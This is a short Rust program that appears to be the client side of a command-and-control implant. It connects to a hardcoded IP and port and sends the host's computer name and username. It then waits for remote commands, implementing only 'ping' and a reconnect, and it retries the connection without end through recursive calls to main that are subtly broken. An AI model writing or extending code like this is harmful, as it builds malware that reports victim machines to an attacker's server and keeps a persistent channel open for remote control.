#[allow(warnings)]

use std::io::{self, Read, Write};
use std::net::TcpStream;

const SERVER : &str = "192.168.2.220";
const PORT : &str = "5005";

fn main() {
    match TcpStream::connect(format!("{}:{}", SERVER, PORT)) {
        Ok(mut stream) => {
            let computer_name = hostname::get().unwrap().into_string().unwrap().into_bytes();
            let username = whoami::username();

            let client_object = format!("{{\"computer_name\": \"{}\", \"username\": \"{}\"}}", String::from_utf8_lossy(&computer_name), username);
            let mut buffer = [0; 1024];

            stream.write_all(client_object.as_bytes()).unwrap();
            loop {
                match stream.read(&mut buffer) {
                    Ok(0) | Err(_) => {
                        main();
                    }
                    Ok(bytes_read) => {
                        let command = String::from_utf8_lossy(&buffer[0..bytes_read]);
                        
                        println!("{}", command);
                        match command.trim() {
                            "ping" => {
                                stream.write_all("ping".as_bytes()).unwrap();
                            }
                            "append" => {
                                main();
                            }

                            _ => {
                                continue;
                            }
                        }
                    }
                }
            }
        }
        Err(_) => {
            main();
        }
    }
}